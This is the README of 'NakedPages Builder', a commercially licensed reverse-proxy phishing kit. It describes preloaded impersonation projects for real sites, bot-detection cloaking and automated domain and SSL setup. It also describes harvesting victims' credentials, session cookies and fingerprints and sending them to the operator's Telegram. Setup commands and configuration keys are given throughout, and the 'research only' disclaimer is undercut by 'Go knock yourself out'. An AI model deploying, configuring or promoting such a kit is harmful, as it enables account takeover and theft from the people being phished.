# NakedPages Builder
## _Included with nkp executor_

**Disclaimer: `nakedpages` and all its `modules` was created for research purpose only. By using this software you agree that you take full responsibility for whaever use case, and the developer @nakedpages has no responsibility for any action/repercussion from using `nakedpages`**
#### _That been said "Go knock yourself out"_ ###

![LOGO]()

Nakedpages-Builder allows you to run a **battle tested** and experienced phishing app in nodesJS, using a few lines of autogenerated JS code, Configuration for each project are written in Plain Javascript thus making **everything and anything possible** also giving you access to low level access to request/response object without making changes `nkp.app` which is the binary the whole platform runs on.
#### _project are configurations made up of a directory, main.js inside the direcotry, and any other file you wish to include, the directory name is the project name"_ ###

## Features

- Fully Integrated and battle tested antibot DB integrated, detects all kinds of bots in over 120 countries
- One click setup and launch with command `bash setup/sh` 
- Auto Ready-made Project Generation with 0 lines of code with command `node generate-project.js`
- Auto SSL and domain configuration with `bash change-domain.sh` script
- Strong Session AUTH with Fingerprints and Cookies, Database Storage with mongodb
- Support Also Rendering PHP files, also passing data from php to reverse proxy and vice versa
- Results, Cookies and User Fingerprint is sent to **Teleram** configure your Telegram user id in `config.env`
- Manually deliver results, decode response, add cookies, filter user and a whole lot more from the user Js config
- Thanks to JS project configuration, you can access the request/response and also clientContext object for your use case
- Comes preloaded with many sites projects you can find them in `./projects`
- Unlike other reverse proxy apps, this is real life tested to handle multiple traffics
- One click Support for working in local enviroment with mkcert
- Put your assets inside the executable to make it even more portable
- Configurations of product are made in JS **(everyone loves javascript)**

## Usage
```sh
git clone https://github.com/nakedpages/nakedPages-Builder
# clone repository
./setup.sh
# answe the 2-3 questions, pick a ready made configuration
Chmod 755 nkp.app
# Change mode of the binary
npm run start
# And your app should be live and ready to accept traffic
```

### Commands and Scripts

##### Setup
`./setup.sh` Initial setup to install necesssary files and ceate neccessary configuration
`node setup-user.sh`  To setup User configuration in `config.env` auto called by `setup.sh`

##### Setup
`bash change-domain.sh` Changes the domain to a new domain and setup SSL  with certbot
**NOTE: A record of your server IP must be pointed to the domain else ssl will fail and domain change will not occur**

`bash setup-local-ssl.sh` Configures SSL and domain for localhost and dev enviroment
**You can then access the page via https://localhost/?SRC_KEY**, You can find **SRC_KEY** value in `config.env`

##### Project
`node new-project.js` Creates a new project from template, After Creating edit config.env and set CURRENT_PROJECT to the new created project name
**NOTE: By default you donot need to make any more configuratio, the newly created project should work perfect for most sites**

#### License
`node activate-license.js` To activate the `nkp.app` file
**While the NKP.APP is Free to USE, a license is needed to regulate its usage, Contact Me for license key**


### Configuration
`config.env` **User Configuraion, Auto Generated by `setup-user.js`**
* BOT_REDIRECT: Location to redirect BOTS default is auto set
* CURRENT_PROJECT: The project you wish to use
* TELEGRAM_USER_ID: Your numeric uSERID for Telegram to send results, cookies to
* SRC_KEY: Site key to attach at the bank of the url, as the entrance url
* GATE_KEY: Antibot KEY, default is used
* GLOBAL_AGENT_HTTP_PROXY: If you wish to enable proxy
* 

`.env` **`nkp.app` Configuration, Auto Generated by `setup.sh`**  ***__DONOT EDIT EXCEPT YOU KNOW WHAT YOU ARE DOING__***
* HOST_IP: Current server ip {__Auto Generated__}
* MONGODB_URI: Mongodb URL and path  {__Auto Generated__}
* HOST_PORT: Port Default 80  {__Auto Generated__}
* TDS_URL: Url for Antibot {__Auto Generated__}
* MANAGER_ID: ID of the current user default: betaman  {__Auto Generated__}
* AUTO_DIR: Directory of auto files {__Auto Generated__}
* ENV: Enviroment, DEVELOPMENT for localhost, PRODUCTION for live servers {__Auto Generated__} {__Auto Generated__}
* RAW_COOKIES: If you donot want your cookies parsed {__Auto Generated__}
* SUBDOMAIN_CHAR: Character for recognizing subdomains and extern urls in paths {__Auto Generated__}
* LOG_FILE: Log file {__Auto Generated__}
* DEBUG_FILE: Debug file {__Auto Generated__}
* USER_CONFIG: User Configuration file {__Auto Generated__}

### Projects
Directory `./projects` contain different direcory configuration for different websites
In each subdirecoty you will find `.main.js` which is the js file for that project.
#### When starting The `nkp.app` searches for `./projects/CURRENT_PROJECT/main.js` where __CURRENT_PROJECT__ is the project name you set in `config.env`

## Config Documentation
Documentation for creating, editing and managing configuration can be found here [ConfigDoc.md](/ConfigDoc.md).
